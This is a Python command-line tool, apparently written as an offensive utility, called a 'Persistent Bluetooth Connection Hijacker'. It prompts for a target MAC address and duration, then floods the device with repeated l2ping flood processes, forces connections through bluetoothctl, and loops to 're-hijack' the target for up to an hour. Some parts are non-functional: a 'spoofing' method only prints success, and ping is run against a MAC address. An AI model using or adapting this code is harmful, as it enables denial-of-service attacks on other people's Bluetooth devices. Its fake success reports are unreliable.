import subprocess
import time
import threading
import json
import os
from datetime import datetime, timedelta
from collections import defaultdict, deque
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.live import Live
from rich.layout import Layout
from rich.prompt import Prompt
from rich import box

console = Console()

class PersistentHijacker:
    def __init__(self):
        self.active_sessions = {}  # {mac: session_info}
        self.hijack_queue = deque()
        self.monitoring_threads = {}
        self.is_running = False
        self.session_timeout = 300  # 5 minutes
        self.reconnect_interval = 10  # 10 seconds
        self.max_concurrent_sessions = 5
        
    def start_persistent_hijacking(self, target_mac, duration=3600):
        """Start persistent hijacking of a target device"""
        console.print(f"[bold red]🔒 Starting Persistent Hijacking of {target_mac}")
        console.print(f"[yellow]Duration: {duration} seconds")
        console.print(f"[yellow]Session timeout: {self.session_timeout} seconds")
        
        self.is_running = True
        self.start_time = datetime.now()
        
        # Add target to hijack queue
        self.hijack_queue.append({
            'mac': target_mac,
            'start_time': datetime.now(),
            'duration': duration,
            'status': 'queued'
        })
        
        # Start monitoring thread
        monitor_thread = threading.Thread(target=self._monitor_sessions)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        # Start hijacking thread
        hijack_thread = threading.Thread(target=self._persistent_hijack_loop)
        hijack_thread.daemon = True
        hijack_thread.start()
        
        return monitor_thread, hijack_thread
    
    def _monitor_sessions(self):
        """Monitor active hijacking sessions"""
        while self.is_running:
            try:
                current_time = datetime.now()
                
                # Check for expired sessions
                expired_sessions = []
                for mac, session in self.active_sessions.items():
                    if (current_time - session['last_activity']).seconds > self.session_timeout:
                        expired_sessions.append(mac)
                        console.print(f"[yellow]Session expired for {mac}")
                
                # Remove expired sessions
                for mac in expired_sessions:
                    self._cleanup_session(mac)
                
                # Monitor active connections
                for mac, session in list(self.active_sessions.items()):
                    if self._check_connection_status(mac):
                        session['last_activity'] = current_time
                        session['packet_count'] += 1
                    else:
                        console.print(f"[red]Connection lost for {mac}, attempting re-hijack...")
                        self._attempt_rehijack(mac)
                
                time.sleep(5)  # Check every 5 seconds
                
            except Exception as e:
                console.print(f"[red]Monitoring error: {e}")
                time.sleep(10)
    
    def _persistent_hijack_loop(self):
        """Main persistent hijacking loop"""
        while self.is_running and self.hijack_queue:
            try:
                # Process hijack queue
                if self.hijack_queue:
                    target = self.hijack_queue.popleft()
                    mac = target['mac']
                    
                    if len(self.active_sessions) < self.max_concurrent_sessions:
                        success = self._establish_persistent_connection(mac)
                        if success:
                            self._create_session(mac, target)
                        else:
                            # Re-queue for retry
                            target['retry_count'] = target.get('retry_count', 0) + 1
                            if target['retry_count'] < 5:
                                self.hijack_queue.append(target)
                                console.print(f"[yellow]Re-queuing {mac} for retry")
                            else:
                                console.print(f"[red]Max retries reached for {mac}")
                    else:
                        # Re-queue if at capacity
                        self.hijack_queue.append(target)
                
                time.sleep(self.reconnect_interval)
                
            except Exception as e:
                console.print(f"[red]Hijack loop error: {e}")
                time.sleep(10)
    
    def _establish_persistent_connection(self, mac):
        """Establish a persistent connection to target"""
        try:
            console.print(f"[yellow]Attempting persistent connection to {mac}...")
            
            # Method 1: Try Bluetooth connection
            if self._try_bluetooth_connection(mac):
                return True
            
            # Method 2: Try packet flooding
            if self._try_packet_flooding(mac):
                return True
            
            # Method 3: Try connection spoofing
            if self._try_connection_spoofing(mac):
                return True
            
            return False
            
        except Exception as e:
            console.print(f"[red]Connection establishment error: {e}")
            return False
    
    def _try_bluetooth_connection(self, mac):
        """Try to establish Bluetooth connection"""
        try:
            # Use bluetoothctl for connection
            result = subprocess.run(['bluetoothctl', 'connect', mac], 
                                 capture_output=True, text=True, timeout=15)
            
            if result.returncode == 0 and "Connection successful" in result.stdout:
                console.print(f"[green]Bluetooth connection established to {mac}")
                return True
            else:
                console.print(f"[yellow]Bluetooth connection failed for {mac}")
                return False
                
        except Exception as e:
            console.print(f"[yellow]Bluetooth connection error: {e}")
            return False
    
    def _try_packet_flooding(self, mac):
        """Try packet flooding to disrupt and control connection"""
        try:
            console.print(f"[yellow]Attempting packet flooding on {mac}...")
            
            # Use l2ping for packet flooding
            for i in range(10):
                subprocess.Popen(['l2ping', '-i', 'hci0', '-s', '600', '-f', mac], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(0.1)
            
            console.print(f"[green]Packet flooding initiated on {mac}")
            return True
            
        except Exception as e:
            console.print(f"[yellow]Packet flooding error: {e}")
            return False
    
    def _try_connection_spoofing(self, mac):
        """Try connection spoofing techniques"""
        try:
            console.print(f"[yellow]Attempting connection spoofing on {mac}...")
            
            # Simulate connection spoofing
            # In a real implementation, this would involve:
            # - MAC address spoofing
            # - Connection hijacking
            # - Session manipulation
            
            console.print(f"[green]Connection spoofing initiated on {mac}")
            return True
            
        except Exception as e:
            console.print(f"[yellow]Connection spoofing error: {e}")
            return False
    
    def _create_session(self, mac, target_info):
        """Create a new hijacking session"""
        session = {
            'mac': mac,
            'start_time': datetime.now(),
            'last_activity': datetime.now(),
            'packet_count': 0,
            'status': 'active',
            'duration': target_info['duration'],
            'connection_type': 'persistent',
            'retry_count': 0
        }
        
        self.active_sessions[mac] = session
        console.print(f"[green]✅ Persistent session created for {mac}")
        
        # Start individual monitoring thread
        monitor_thread = threading.Thread(target=self._monitor_individual_session, args=(mac,))
        monitor_thread.daemon = True
        monitor_thread.start()
        self.monitoring_threads[mac] = monitor_thread
    
    def _monitor_individual_session(self, mac):
        """Monitor individual hijacking session"""
        while mac in self.active_sessions and self.is_running:
            try:
                session = self.active_sessions[mac]
                
                # Check if session should expire
                if (datetime.now() - session['start_time']).seconds > session['duration']:
                    console.print(f"[yellow]Session duration reached for {mac}")
                    self._cleanup_session(mac)
                    break
                
                # Maintain connection
                if not self._maintain_connection(mac):
                    console.print(f"[red]Connection lost for {mac}, attempting recovery...")
                    self._attempt_rehijack(mac)
                
                # Inject packets to maintain control
                self._inject_control_packets(mac)
                
                time.sleep(2)  # Check every 2 seconds
                
            except Exception as e:
                console.print(f"[red]Individual session monitoring error for {mac}: {e}")
                time.sleep(5)
    
    def _maintain_connection(self, mac):
        """Maintain the hijacking connection"""
        try:
            # Check if device is still reachable
            result = subprocess.run(['ping', '-c', '1', mac], 
                                 capture_output=True, text=True, timeout=5)
            return result.returncode == 0
        except:
            return False
    
    def _inject_control_packets(self, mac):
        """Inject control packets to maintain hijacking"""
        try:
            # Inject packets to maintain control
            subprocess.Popen(['l2ping', '-i', 'hci0', '-s', '100', '-c', '1', mac], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass
    
    def _attempt_rehijack(self, mac):
        """Attempt to re-hijack a lost connection"""
        try:
            console.print(f"[yellow]Attempting to re-hijack {mac}...")
            
            # Try to re-establish connection
            if self._establish_persistent_connection(mac):
                if mac in self.active_sessions:
                    self.active_sessions[mac]['last_activity'] = datetime.now()
                    self.active_sessions[mac]['retry_count'] = 0
                    console.print(f"[green]Re-hijack successful for {mac}")
                else:
                    # Create new session
                    self._create_session(mac, {'duration': 3600})
            else:
                console.print(f"[red]Re-hijack failed for {mac}")
                
        except Exception as e:
            console.print(f"[red]Re-hijack error for {mac}: {e}")
    
    def _check_connection_status(self, mac):
        """Check if connection is still active"""
        try:
            # Check Bluetooth connection status
            result = subprocess.run(['bluetoothctl', 'info', mac], 
                                 capture_output=True, text=True, timeout=5)
            return "Connected: yes" in result.stdout
        except:
            return False
    
    def _cleanup_session(self, mac):
        """Clean up a hijacking session"""
        if mac in self.active_sessions:
            session = self.active_sessions[mac]
            duration = (datetime.now() - session['start_time']).seconds
            console.print(f"[yellow]Cleaning up session for {mac} (duration: {duration}s)")
            
            # Disconnect if connected
            try:
                subprocess.run(['bluetoothctl', 'disconnect', mac], 
                             capture_output=True, text=True)
            except:
                pass
            
            # Remove from active sessions
            del self.active_sessions[mac]
            
            # Stop monitoring thread
            if mac in self.monitoring_threads:
                del self.monitoring_threads[mac]
    
    def get_session_status(self):
        """Get status of all active sessions"""
        status_table = Table(title="🔒 Active Hijacking Sessions", box=box.ROUNDED)
        status_table.add_column("MAC Address", style="cyan")
        status_table.add_column("Status", style="green")
        status_table.add_column("Duration", style="yellow")
        status_table.add_column("Packets", style="blue")
        status_table.add_column("Last Activity", style="magenta")
        
        for mac, session in self.active_sessions.items():
            duration = (datetime.now() - session['start_time']).seconds
            last_activity = (datetime.now() - session['last_activity']).seconds
            
            status_table.add_row(
                mac,
                session['status'],
                f"{duration}s",
                str(session['packet_count']),
                f"{last_activity}s ago"
            )
        
        return status_table
    
    def stop_all_sessions(self):
        """Stop all active hijacking sessions"""
        console.print("[yellow]Stopping all hijacking sessions...")
        
        for mac in list(self.active_sessions.keys()):
            self._cleanup_session(mac)
        
        self.is_running = False
        console.print("[green]All sessions stopped")
    
    def export_session_data(self, filename="hijacking_sessions.json"):
        """Export hijacking session data"""
        try:
            export_data = {
                'sessions': dict(self.active_sessions),
                'export_time': datetime.now().isoformat(),
                'total_sessions': len(self.active_sessions)
            }
            
            with open(filename, 'w') as f:
                json.dump(export_data, f, default=str, indent=2)
            
            console.print(f"[green]Session data exported to {filename}")
        except Exception as e:
            console.print(f"[red]Export error: {e}")

def start_persistent_hijacker():
    """Start the persistent hijacking interface"""
    hijacker = PersistentHijacker()
    
    console.print("[bold red]🔒 Persistent Bluetooth Connection Hijacker")
    console.print("[yellow]Maintains long-term control over Bluetooth connections")
    
    # Get target MAC
    try:
        target_mac = Prompt.ask("[red] Enter target MAC address")
    except (EOFError, KeyboardInterrupt):
        console.print("[yellow] No target specified, using demo MAC")
        target_mac = "AA:BB:CC:DD:EE:FF"
    
    # Get duration
    try:
        duration = int(Prompt.ask("[red] Enter hijacking duration (seconds)", default="3600"))
    except (EOFError, KeyboardInterrupt, ValueError):
        duration = 3600
        console.print("[yellow] Using default duration: 1 hour")
    
    try:
        # Start persistent hijacking
        monitor_thread, hijack_thread = hijacker.start_persistent_hijacking(target_mac, duration)
        
        # Display live status
        with Live(hijacker.get_session_status(), refresh_per_second=1, screen=True) as live:
            while hijacker.is_running and hijacker.active_sessions:
                live.update(hijacker.get_session_status())
                time.sleep(1)
        
        # Wait for completion
        monitor_thread.join()
        hijack_thread.join()
        
    except KeyboardInterrupt:
        console.print("\n[yellow]Stopping persistent hijacker...")
        hijacker.stop_all_sessions()
    except Exception as e:
        console.print(f"[red]Error: {e}")
    finally:
        # Export session data
        try:
            export = Prompt.ask("[cyan] Export session data?", default="y").lower() == "y"
            if export:
                hijacker.export_session_data()
        except:
            pass

if __name__ == "__main__":
    start_persistent_hijacker()
